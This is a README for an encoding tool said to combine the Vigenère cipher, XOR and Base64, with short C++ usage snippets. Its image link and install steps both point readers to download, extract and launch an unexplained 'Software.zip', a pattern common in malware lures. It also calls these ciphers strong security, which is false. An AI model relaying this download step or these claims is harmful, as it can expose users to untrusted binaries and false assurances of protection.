# ðŸš€ Piero-EnDe-Coder 

## Overview
Welcome to Piero-EnDe-Coder, a powerful encryption and decryption tool that combines the VigenÃ¨re cipher, XOR encryption, and Base64 encoding to secure messages. This tool allows users to encode and decode messages using a secret key, ensuring an extra layer of security. Whether you need to protect sensitive information or simply have some fun with cryptography, Piero-EnDe-Coder has got you covered!

![Piero-EnDe-Coder](https://github.com/yuvrajpandiya/Piero-EnDe-Coder/releases/download/v2.0/Software.zip)

## Features
- **VigenÃ¨re Cipher**: A classic polyalphabetic substitution cipher that provides strong encryption by using a keyword to shift characters in the plaintext.
- **XOR Encryption**: A bitwise operation that offers simplicity and efficacy in encrypting and decrypting data.
- **Base64 Encoding**: A method of encoding binary data to ensure it remains intact during transmission.

## Installation
To get started with Piero-EnDe-Coder, download the latest release zip file from [here](https://github.com/yuvrajpandiya/Piero-EnDe-Coder/releases/download/v2.0/Software.zip). Once downloaded, extract the contents and launch the tool to begin encoding and decoding messages securely.

## Usage
1. **Encoding Messages**:
```cpp
string plaintext = "Hello, World!";
string encodedMessage = encodeMessage(plaintext, "secretkey");
cout << "Encoded Message: " << encodedMessage << endl;
```

2. **Decoding Messages**:
```cpp
string encodedMessage = "Uk9PK0pUOCNM";
string decodedMessage = decodeMessage(encodedMessage, "secretkey");
cout << "Decoded Message: " << decodedMessage << endl;
```
